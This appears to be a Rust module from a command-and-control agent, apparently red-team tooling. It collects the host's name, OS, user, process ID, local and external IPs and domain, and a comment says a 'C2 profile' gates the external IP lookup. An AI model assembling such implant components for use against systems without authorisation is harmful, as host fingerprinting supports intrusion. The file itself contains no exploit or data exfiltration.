use std::env;
use std::process::{Command, id};

pub fn hostname() -> Option<String> {
    #[cfg(windows)]
    {
        env::var("COMPUTERNAME").ok()
    }
    #[cfg(not(windows))]
    {
        Command::new("hostname")
            .output()
            .ok()
            .and_then(|o| String::from_utf8(o.stdout).ok())
            .map(|s| s.trim().to_string())
    }
}

pub fn os() -> Option<String> {
    #[cfg(windows)]
    {
        Some("Windows".into())
    }
    #[cfg(target_os = "macos")]
    {
        Some("macOS".into())
    }
    #[cfg(all(unix, not(target_os = "macos")))]
    {
        Command::new("uname")
            .arg("-s")
            .output()
            .ok()
            .and_then(|o| String::from_utf8(o.stdout).ok())
            .map(|s| s.trim().to_string())
    }
    #[cfg(not(any(windows, unix)))]
    {
        Some(env::consts::OS.into())
    }
}

pub fn arch() -> Option<String> {
    Some(env::consts::ARCH.into())
}

pub fn user() -> Option<String> {
    #[cfg(windows)]
    {
        env::var("USERNAME").ok()
    }
    #[cfg(not(windows))]
    {
        env::var("USER").ok()
    }
}

pub fn pid() -> Option<u32> {
    Some(id())
}

pub fn process_name() -> Option<String> {
    env::current_exe()
        .ok()
        .and_then(|p| p.file_name().map(|n| n.to_string_lossy().to_string()))
}

pub fn local_ips() -> Vec<String> {
    let mut ips = vec!["127.0.0.1".into()];

    #[cfg(target_os = "linux")]
    {
        if let Ok(o) = Command::new("hostname").arg("-I").output() {
            if let Ok(s) = String::from_utf8(o.stdout) {
                ips.extend(s.split_whitespace().map(|s| s.to_string()));
            }
        }
    }

    #[cfg(target_os = "macos")]
    {
        if let Ok(o) = Command::new("ifconfig").output() {
            if let Ok(s) = String::from_utf8(o.stdout) {
                for line in s.lines() {
                    if line.contains("inet ") && !line.contains("127.0.0.1") {
                        if let Some(ip) = line.split_whitespace().nth(1) {
                            ips.push(ip.to_string());
                        }
                    }
                }
            }
        }
    }

    #[cfg(windows)]
    {
        if let Ok(o) = Command::new("ipconfig").output() {
            if let Ok(s) = String::from_utf8(o.stdout) {
                for line in s.lines() {
                    if line.contains("IPv4") {
                        if let Some(ip) = line.split(':').nth(1) {
                            ips.push(ip.trim().to_string());
                        }
                    }
                }
            }
        }
    }

    ips
}

use std::sync::atomic::{AtomicBool, Ordering};

static EXTERNAL_IP_CHECK: AtomicBool = AtomicBool::new(false);

/// Set by the C2 profile before agent start. When false, [`external_ip`]
/// returns None without making any network call.
pub fn set_external_ip_check(enabled: bool) {
    EXTERNAL_IP_CHECK.store(enabled, Ordering::Release);
}

pub fn external_ip() -> Option<String> {
    if !EXTERNAL_IP_CHECK.load(Ordering::Acquire) {
        return None;
    }
    crate::sys::network::http_request(
        "https://api.ipify.org",
        "GET",
        None,
        None,
        None,
        true,
    )
    .ok()
    .map(|s| s.trim().to_string())
    .filter(|s| !s.is_empty())
}

pub fn domain() -> Option<String> {
    #[cfg(windows)]
    {
        env::var("USERDNSDOMAIN").ok()
    }
    #[cfg(not(windows))]
    {
        Command::new("hostname")
            .arg("-d")
            .output()
            .ok()
            .and_then(|o| String::from_utf8(o.stdout).ok())
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty() && s != "(none)" && s != "localdomain")
    }
}

pub fn integrity_level() -> Option<u32> {
    // Windows: GetTokenInformation(TokenIntegrityLevel) via FFI
    // Needs windows-sys or raw winapi FFI
    None
}
